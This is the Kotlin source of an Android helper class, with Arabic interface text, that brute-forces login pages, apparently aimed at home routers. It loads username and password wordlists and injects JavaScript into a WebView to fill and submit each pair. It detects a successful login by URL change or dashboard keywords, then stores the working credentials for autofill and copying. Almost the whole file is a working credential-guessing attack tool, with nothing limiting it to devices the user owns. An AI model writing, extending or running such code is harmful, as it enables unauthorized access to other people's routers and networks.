package com.net.routerbrowser

import android.app.AlertDialog
import android.content.ClipData
import android.content.ClipboardManager
import android.content.Context
import android.net.Uri
import android.os.Handler
import android.os.Looper
import android.text.InputType
import android.view.View
import android.webkit.WebView
import android.widget.Button
import android.widget.EditText
import android.widget.LinearLayout
import android.widget.RadioButton
import android.widget.RadioGroup
import android.widget.TextView
import android.widget.Toast
import org.json.JSONArray
import org.json.JSONObject
import java.io.BufferedReader
import java.io.InputStreamReader

class CredentialTesterHelper(
    private val context: Context,
    private val getActiveWebView: () -> WebView?,
    private val onPickUserWordlist: () -> Unit,
    private val onPickPassWordlist: () -> Unit
) {

    data class SavedCredential(
        val targetUrl: String,
        val username: String,
        val password: String,
        val timestamp: Long
    )

    data class AttemptPair(
        val username: String,
        val password: String
    )

    private val handler = Handler(Looper.getMainLooper())
    private var isRunning = false
    private var attemptQueue: List<AttemptPair> = emptyList()
    private var currentIndex = 0
    private var delayMs: Long = 1800L
    private var initialUrl: String = ""
    private var initialBasePath: String = ""

    private var statusBarView: View? = null
    private var statusTextView: TextView? = null
    private var stopButton: Button? = null

    private var tvSelectedUserFile: TextView? = null
    private var tvSelectedPassFile: TextView? = null
    private var selectedUserUri: Uri? = null
    private var selectedPassUri: Uri? = null

    private var currentAttemptRunnable: Runnable? = null
    private var verifySuccessRunnable: Runnable? = null

    fun attachStatusBar(
        container: View,
        statusText: TextView,
        btnStop: Button
    ) {
        this.statusBarView = container
        this.statusTextView = statusText
        this.stopButton = btnStop

        container.visibility = View.GONE
        btnStop.setOnClickListener {
            stopTesting("تم إيقاف الاختبار يدوياً")
        }
    }

    fun onUserWordlistPicked(uri: Uri?) {
        selectedUserUri = uri
        val count = uri?.let { readLinesFromUri(it).size } ?: 0
        tvSelectedUserFile?.text = if (uri != null) {
            "ملف المستخدمين: ${uri.lastPathSegment ?: "محدد"} ($count سطر)"
        } else {
            "لم يتم اختيار ملف مستخدمين"
        }
    }

    fun onPassWordlistPicked(uri: Uri?) {
        selectedPassUri = uri
        val count = uri?.let { readLinesFromUri(it).size } ?: 0
        tvSelectedPassFile?.text = if (uri != null) {
            "ملف كلمات المرور: ${uri.lastPathSegment ?: "محدد"} ($count سطر)"
        } else {
            "لم يتم اختيار ملف كلمات مرور"
        }
    }

    fun showConfigDialog() {
        val webView = getActiveWebView()
        if (webView == null) {
            Toast.makeText(context, "لا توجد صفحة WebView نشطة", Toast.LENGTH_SHORT).show()
            return
        }

        val root = LinearLayout(context).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(44, 28, 44, 16)
        }

        val tvModeLabel = TextView(context).apply {
            text = "اختر عدد حقول الإدخال في الصفحة:"
            textSize = 14f
        }
        root.addView(tvModeLabel)

        val radioGroup = RadioGroup(context).apply {
            orientation = RadioGroup.HORIZONTAL
        }
        val rbOneField = RadioButton(context).apply {
            id = View.generateViewId()
            text = "حقل واحد (باسوورد)"
            isChecked = true
        }
        val rbTwoFields = RadioButton(context).apply {
            id = View.generateViewId()
            text = "حقلين (يوزر + باس)"
        }
        radioGroup.addView(rbOneField)
        radioGroup.addView(rbTwoFields)
        root.addView(radioGroup)

        val userSection = LinearLayout(context).apply {
            orientation = LinearLayout.VERTICAL
            visibility = View.GONE
            setPadding(0, 12, 0, 8)
        }
        val btnPickUser = Button(context).apply {
            text = "اختيار ملف Wordlist للمستخدم"
            setOnClickListener { onPickUserWordlist() }
        }
        val tvUserInfo = TextView(context).apply {
            text = selectedUserUri?.let {
                "ملف المستخدمين: ${it.lastPathSegment ?: "محدد"} (${readLinesFromUri(it).size} سطر)"
            } ?: "لم يتم اختيار ملف مستخدمين"
            textSize = 12f
        }
        tvSelectedUserFile = tvUserInfo
        userSection.addView(btnPickUser)
        userSection.addView(tvUserInfo)
        root.addView(userSection)

        radioGroup.setOnCheckedChangeListener { _, checkedId ->
            userSection.visibility = if (checkedId == rbTwoFields.id) View.VISIBLE else View.GONE
        }

        val passSection = LinearLayout(context).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(0, 8, 0, 12)
        }
        val btnPickPass = Button(context).apply {
            text = "اختيار ملف Wordlist لكلمة المرور"
            setOnClickListener { onPickPassWordlist() }
        }
        val tvPassInfo = TextView(context).apply {
            text = selectedPassUri?.let {
                "ملف كلمات المرور: ${it.lastPathSegment ?: "محدد"} (${readLinesFromUri(it).size} سطر)"
            } ?: "لم يتم اختيار ملف كلمات مرور"
            textSize = 12f
        }
        tvSelectedPassFile = tvPassInfo
        passSection.addView(btnPickPass)
        passSection.addView(tvPassInfo)
        root.addView(passSection)

        val etDelay = EditText(context).apply {
            hint = "الفاصل الزمني بالميلي ثانية (مثال: 1800)"
            setText(delayMs.toString())
            inputType = InputType.TYPE_CLASS_NUMBER
        }
        root.addView(etDelay)

        AlertDialog.Builder(context)
            .setTitle("اختبار القوائم (Wordlist)")
            .setView(root)
            .setPositiveButton("بدء الاختبار") { _, _ ->
                val isTwoFields = rbTwoFields.isChecked
                val parsedDelay = etDelay.text.toString().toLongOrNull() ?: 1800L
                startTesting(isTwoFields, parsedDelay.coerceAtLeast(600L))
            }
            .setNegativeButton("إلغاء", null)
            .setOnDismissListener {
                tvSelectedUserFile = null
                tvSelectedPassFile = null
            }
            .show()
    }

    private fun normalizeBaseUrl(rawUrl: String): String {
        return rawUrl.substringBefore("?").substringBefore("#").trimEnd('/')
    }

    private fun startTesting(twoFieldsMode: Boolean, intervalMs: Long) {
        val webView = getActiveWebView()
        if (webView == null) {
            Toast.makeText(context, "لا توجد صفحة مفتوحة", Toast.LENGTH_SHORT).show()
            return
        }

        val passList = selectedPassUri?.let { readLinesFromUri(it) } ?: emptyList()
        if (passList.isEmpty()) {
            Toast.makeText(context, "اختر ملف كلمات مرور يحتوي على كلمات أولاً", Toast.LENGTH_SHORT).show()
            return
        }

        val pairs = mutableListOf<AttemptPair>()
        if (twoFieldsMode) {
            val userList = selectedUserUri?.let { readLinesFromUri(it) } ?: emptyList()
            if (userList.isEmpty()) {
                Toast.makeText(context, "اختر ملف أسماء مستخدمين أولاً", Toast.LENGTH_SHORT).show()
                return
            }
            for (u in userList) {
                for (p in passList) {
                    pairs.add(AttemptPair(u, p))
                }
            }
        } else {
            for (p in passList) {
                pairs.add(AttemptPair("", p))
            }
        }

        if (pairs.isEmpty()) return

        stopTesting(silent = true)

        attemptQueue = pairs
        currentIndex = 0
        delayMs = intervalMs
        initialUrl = webView.url ?: ""
        initialBasePath = normalizeBaseUrl(initialUrl)
        isRunning = true

        statusBarView?.visibility = View.VISIBLE
        scheduleNextAttempt()
    }

    private fun scheduleNextAttempt() {
        if (!isRunning) return
        if (currentIndex >= attemptQueue.size) {
            stopTesting("انتهت جميع المحاولات في القائمة")
            return
        }

        val pair = attemptQueue[currentIndex]
        val displayAttempt = if (pair.username.isNotEmpty()) {
            "${pair.username} / ${pair.password}"
        } else {
            pair.password
        }
        statusTextView?.text = "محاولة ${currentIndex + 1}/${attemptQueue.size}: $displayAttempt"

        currentAttemptRunnable = Runnable {
            if (!isRunning) return@Runnable
            val webView = getActiveWebView()
            if (webView == null) {
                stopTesting("تم إغلاق الصفحة")
                return@Runnable
            }

            // ننتظر إذا كانت الصفحة في لحظة إعادة تحميل (Refresh) ثم نملأ الحقول ونطابق القيمة
            injectWithRetry(webView, pair, attemptFillCount = 0)
        }

        handler.postDelayed(currentAttemptRunnable!!, 250L)
    }

    private fun injectWithRetry(webView: WebView, pair: AttemptPair, attemptFillCount: Int) {
        if (!isRunning) return
        val activeWv = getActiveWebView() ?: return

        if (activeWv.progress < 100 && attemptFillCount < 5) {
            handler.postDelayed({
                injectWithRetry(activeWv, pair, attemptFillCount + 1)
            }, 300L)
            return
        }

        val escapedUser = JSONObject.quote(pair.username)
        val escapedPass = JSONObject.quote(pair.password)

        val js = """
(function() {
    var targetUser = __USER__;
    var targetPass = __PASS__;

    function isVisible(el) {
        if (!el || el.disabled) return false;
        var r = el.getBoundingClientRect();
        var s = window.getComputedStyle(el);
        return s.display !== 'none' && s.visibility !== 'hidden' && parseFloat(s.opacity) > 0 && r.width > 10 && r.height > 10;
    }

    function setFieldValue(el, val) {
        if (!el) return false;
        try {
            if (el.readOnly) el.readOnly = false;
            el.focus();
            el.dispatchEvent(new FocusEvent('focus', { bubbles: true }));
            el.dispatchEvent(new FocusEvent('focusin', { bubbles: true }));
            el.click();

            var proto = Object.getPrototypeOf(el);
            var desc = Object.getOwnPropertyDescriptor(proto, 'value') ||
                       Object.getOwnPropertyDescriptor(HTMLInputElement.prototype, 'value');
            if (desc && desc.set) {
                desc.set.call(el, val);
            } else {
                el.value = val;
            }
            el.setAttribute('value', val);

            el.dispatchEvent(new KeyboardEvent('keydown', { bubbles: true, key: 'a' }));
            el.dispatchEvent(new Event('input', { bubbles: true }));
            el.dispatchEvent(new KeyboardEvent('keyup', { bubbles: true, key: 'a' }));
            el.dispatchEvent(new Event('change', { bubbles: true }));
            el.dispatchEvent(new Event('blur', { bubbles: true }));
            return el.value === val;
        } catch (e) {
            return false;
        }
    }

    var allInputs = Array.from(document.querySelectorAll('input'));
    var visibleInputs = allInputs.filter(function(i) {
        var t = (i.type || '').toLowerCase();
        return t !== 'hidden' && t !== 'submit' && t !== 'button' && t !== 'reset' && t !== 'checkbox' && t !== 'radio' && isVisible(i);
    });

    // بعض صفحات الراوتر (مثل Tenda) تضع حقل نصي وهمي أو حقل password مخفي/ظاهر
    var passCandidates = visibleInputs.filter(function(i) {
        var t = (i.type || '').toLowerCase();
        var meta = ((i.name || '') + ' ' + (i.id || '') + ' ' + (i.placeholder || '')).toLowerCase();
        return t === 'password' || /pass|pwd|passwd|رمز|كلمة/i.test(meta);
    });

    var userCandidates = visibleInputs.filter(function(i) {
        if (passCandidates.indexOf(i) !== -1) return false;
        var t = (i.type || '').toLowerCase();
        return t === 'text' || t === 'email' || t === 'tel';
    });

    var filledTargets = [];

    if (targetUser && targetUser.length > 0 && userCandidates.length > 0) {
        for (var u = 0; u < userCandidates.length; u++) {
            var uEl = userCandidates[u];
            if (setFieldValue(uEl, targetUser)) {
                filledTargets.push({ tag: uEl.tagName, id: uEl.id || '', name: uEl.name || '', val: uEl.value });
            }
        }
    }

    var passFilled = false;
    for (var p = 0; p < passCandidates.length; p++) {
        var pEl = passCandidates[p];
        if (setFieldValue(pEl, targetPass)) {
            passFilled = true;
            filledTargets.push({ tag: pEl.tagName, id: pEl.id || '', name: pEl.name || '', val: pEl.value });
        }
    }

    // إذا لم يُعثر على حقل باسوورد ضمن المرشحين، جرّب آخر حقل نصي ظاهر
    if (!passFilled && visibleInputs.length > 0) {
        var fallback = visibleInputs[visibleInputs.length - 1];
        if (setFieldValue(fallback, targetPass)) {
            passFilled = true;
            filledTargets.push({ tag: fallback.tagName, id: fallback.id || '', name: fallback.name || '', val: fallback.value });
        }
    }

    if (!passFilled || targetPass.length === 0) {
        return JSON.stringify({ ok: false, reason: "EMPTY_OR_NO_PASS_INPUT", count: filledTargets.length });
    }

    var submitBtn = Array.from(document.querySelectorAll('button, input[type="submit"], input[type="button"], a')).find(function(el) {
        if (!isVisible(el)) return false;
        var t = (el.innerText || el.value || '').trim().toLowerCase();
        return t.includes('login') || t.includes('log in') || t.includes('sign in') ||
               t.includes('دخول') || t.includes('تسجيل') || t.includes('submit') || t.includes('ok');
    });

    if (submitBtn) {
        submitBtn.focus();
        submitBtn.click();
    } else if (passCandidates[0] && passCandidates[0].form) {
        passCandidates[0].form.submit();
    }

    return JSON.stringify({ ok: true, filled: filledTargets });
})();
        """.trimIndent()
            .replace("__USER__", escapedUser)
            .replace("__PASS__", escapedPass)

        activeWv.evaluateJavascript(js) { rawResult ->
            if (!isRunning) return@evaluateJavascript
            val cleaned = unescapeJsString(rawResult)
            val confirmed = cleaned.contains("${Char(34)}ok${Char(34)}:true")

            if (!confirmed && attemptFillCount < 3) {
                statusTextView?.text = "تجهيز الحقول (${currentIndex + 1}/${attemptQueue.size}): ${pair.password}"
                handler.postDelayed({
                    injectWithRetry(activeWv, pair, attemptFillCount + 1)
                }, 300L)
                return@evaluateJavascript
            }

            verifySuccessRunnable = Runnable {
                if (!isRunning) return@Runnable
                verifyAttemptResult(pair, retryWaitCount = 0)
            }
            handler.postDelayed(verifySuccessRunnable!!, delayMs)
        }
    }

    private fun unescapeJsString(raw: String?): String {
        if (raw == null || raw == "null") return ""
        val q = Char(34).toString()
        val slash = Char(92).toString()
        var s = raw.trim()
        if (s.startsWith(q) && s.endsWith(q) && s.length >= 2) {
            s = s.substring(1, s.length - 1)
        }
        return s.replace(slash + q, q).replace(slash + slash, slash)
    }

    private fun verifyAttemptResult(pair: AttemptPair, retryWaitCount: Int) {
        if (!isRunning) return
        val activeWv = getActiveWebView()
        if (activeWv == null) {
            stopTesting("تم إغلاق الصفحة")
            return
        }

        if (activeWv.progress < 100 && retryWaitCount < 6) {
            handler.postDelayed({
                verifyAttemptResult(pair, retryWaitCount + 1)
            }, 350L)
            return
        }

        val currentUrl = activeWv.url ?: ""
        val currentBase = normalizeBaseUrl(currentUrl)

        val isErrorUrl = currentUrl.contains("err", ignoreCase = true) ||
            currentUrl.contains("fail", ignoreCase = true) ||
            currentUrl.contains("login", ignoreCase = true)

        val urlChangedToDashboard = currentBase.isNotEmpty() &&
            initialBasePath.isNotEmpty() &&
            currentBase != initialBasePath &&
            !isErrorUrl

        if (urlChangedToDashboard) {
            saveCredential(
                targetUrl = currentUrl,
                username = pair.username,
                password = pair.password
            )
            stopTesting("تم الدخول وتغير العنوان! حُفظت البيانات")
            return
        }

        val checkDashboardJs = """
(function() {
    if (document.readyState !== 'complete') {
        return "LOADING";
    }
    var bodyText = (document.body && document.body.innerText) ? document.body.innerText : "";
    var visiblePassInputs = Array.from(document.querySelectorAll('input[type="password"]')).filter(function(i) {
        var r = i.getBoundingClientRect();
        var style = window.getComputedStyle(i);
        return !i.disabled && style.display !== 'none' && style.visibility !== 'hidden' && r.width > 0 && r.height > 0;
    });
    var hasLoginBtn = Array.from(document.querySelectorAll('button, input[type="submit"], input[type="button"], a')).some(function(el) {
        var r = el.getBoundingClientRect();
        var style = window.getComputedStyle(el);
        if (style.display === 'none' || style.visibility === 'hidden' || r.width === 0 || r.height === 0) return false;
        var t = (el.innerText || el.value || '').trim().toLowerCase();
        return /login|log in|sign in|دخول|تسجيل|submit/i.test(t);
    });
    if (visiblePassInputs.length > 0 || (hasLoginBtn && bodyText.trim().length < 20)) {
        return "STILL_LOGIN";
    }
    if (bodyText.trim().length < 15) {
        return "LOADING";
    }
    var hasDashboardSignals = /logout|log out|sign out|reboot|restart|wireless|wan|lan|dhcp|status|firmware|system|network|تسجيل الخروج|خروج|إعادة التشغيل|الشبكة|اللاسلكي|الإعدادات|الحالة/i.test(bodyText);
    var hasFrames = document.querySelectorAll('frame, iframe').length > 0;
    if (hasDashboardSignals || hasFrames) {
        return "DASHBOARD_ENTERED";
    }
    return "STILL_LOGIN";
})();
        """.trimIndent()

        activeWv.evaluateJavascript(checkDashboardJs) { res ->
            if (!isRunning) return@evaluateJavascript
            val state = unescapeJsString(res).ifEmpty { "STILL_LOGIN" }

            if (state == "LOADING" && retryWaitCount < 6) {
                handler.postDelayed({
                    verifyAttemptResult(pair, retryWaitCount + 1)
                }, 350L)
                return@evaluateJavascript
            }

            if (state == "DASHBOARD_ENTERED") {
                saveCredential(
                    targetUrl = currentUrl.ifEmpty { initialUrl },
                    username = pair.username,
                    password = pair.password
                )
                stopTesting("تم الدخول للوحة الإعدادات وحفظ البيانات!")
            } else {
                currentIndex++
                scheduleNextAttempt()
            }
        }
    }

    fun stopTesting(message: String? = null, silent: Boolean = false) {
        isRunning = false
        currentAttemptRunnable?.let { handler.removeCallbacks(it) }
        verifySuccessRunnable?.let { handler.removeCallbacks(it) }
        statusBarView?.visibility = View.GONE
        if (!silent && message != null) {
            Toast.makeText(context, message, Toast.LENGTH_SHORT).show()
        }
    }

    fun saveCredential(targetUrl: String, username: String, password: String) {
        val list = getSavedCredentials().toMutableList()
        list.removeAll { it.targetUrl == targetUrl && it.username == username && it.password == password }
        list.add(
            0,
            SavedCredential(
                targetUrl = targetUrl,
                username = username,
                password = password,
                timestamp = System.currentTimeMillis()
            )
        )
        persistList(list)
    }

    private fun persistList(list: List<SavedCredential>) {
        val arr = JSONArray()
        list.forEach { item ->
            arr.put(JSONObject().apply {
                put("url", item.targetUrl)
                put("user", item.username)
                put("pass", item.password)
                put("time", item.timestamp)
            })
        }
        context.getSharedPreferences("RouterBrowserPrefs", Context.MODE_PRIVATE)
            .edit()
            .putString("saved_credentials", arr.toString())
            .apply()
    }

    fun getSavedCredentials(): List<SavedCredential> {
        val raw = context.getSharedPreferences("RouterBrowserPrefs", Context.MODE_PRIVATE)
            .getString("saved_credentials", "[]") ?: "[]"
        val arr = JSONArray(raw)
        val result = mutableListOf<SavedCredential>()
        for (i in 0 until arr.length()) {
            val obj = arr.optJSONObject(i) ?: continue
            result.add(
                SavedCredential(
                    targetUrl = obj.optString("url"),
                    username = obj.optString("user"),
                    password = obj.optString("pass"),
                    timestamp = obj.optLong("time")
                )
            )
        }
        return result
    }

    fun showSavedCredentialsDialog() {
        val items = getSavedCredentials()
        if (items.isEmpty()) {
            Toast.makeText(context, "لا توجد بيانات محفوظة حالياً", Toast.LENGTH_SHORT).show()
            return
        }

        val labels = items.map { cred ->
            val uPart = if (cred.username.isNotBlank()) "المستخدم: ${cred.username} | " else ""
            "${cred.targetUrl}\n${uPart}كلمة المرور: ${cred.password}"
        }.toTypedArray()

        AlertDialog.Builder(context)
            .setTitle("البيانات الصحيحة المحفوظة (${items.size})")
            .setItems(labels) { _, which ->
                val chosen = items[which]
                showCredentialActionDialog(chosen, which)
            }
            .setNeutralButton("مسح الكل") { _, _ ->
                context.getSharedPreferences("RouterBrowserPrefs", Context.MODE_PRIVATE)
                    .edit()
                    .remove("saved_credentials")
                    .apply()
                Toast.makeText(context, "تم مسح البيانات المحفوظة", Toast.LENGTH_SHORT).show()
            }
            .setNegativeButton("إغلاق", null)
            .show()
    }

    private fun showCredentialActionDialog(cred: SavedCredential, index: Int) {
        val actions = arrayOf(
            "تعبئة تلقائية في الصفحة الحالية",
            "نسخ كلمة المرور",
            "نسخ اسم المستخدم وكلمة المرور",
            "حذف هذا السجل"
        )
        AlertDialog.Builder(context)
            .setTitle(cred.targetUrl)
            .setItems(actions) { _, actIdx ->
                when (actIdx) {
                    0 -> {
                        val webView = getActiveWebView()
                        if (webView != null) {
                            injectWithRetry(webView, AttemptPair(cred.username, cred.password), 0)
                            Toast.makeText(context, "تمت التعبئة في الصفحة", Toast.LENGTH_SHORT).show()
                        }
                    }
                    1 -> copyToClipboard("Password", cred.password)
                    2 -> {
                        val text = if (cred.username.isNotBlank()) "${cred.username}:${cred.password}" else cred.password
                        copyToClipboard("Credentials", text)
                    }
                    3 -> {
                        val updated = getSavedCredentials().toMutableList()
                        if (index in updated.indices) {
                            updated.removeAt(index)
                            persistList(updated)
                            Toast.makeText(context, "تم حذف السجل", Toast.LENGTH_SHORT).show()
                        }
                    }
                }
            }
            .setNegativeButton("رجوع", null)
            .show()
    }

    private fun copyToClipboard(label: String, text: String) {
        val clipboard = context.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
        clipboard.setPrimaryClip(ClipData.newPlainText(label, text))
        Toast.makeText(context, "تم النسخ إلى الحافظة", Toast.LENGTH_SHORT).show()
    }

    private fun readLinesFromUri(uri: Uri): List<String> {
        return try {
            context.contentResolver.openInputStream(uri)?.use { inputStream ->
                BufferedReader(InputStreamReader(inputStream)).useLines { lines ->
                    lines.map { it.trim() }.filter { it.isNotEmpty() }.toList()
                }
            } ?: emptyList()
        } catch (_: Exception) {
            emptyList()
        }
    }
}
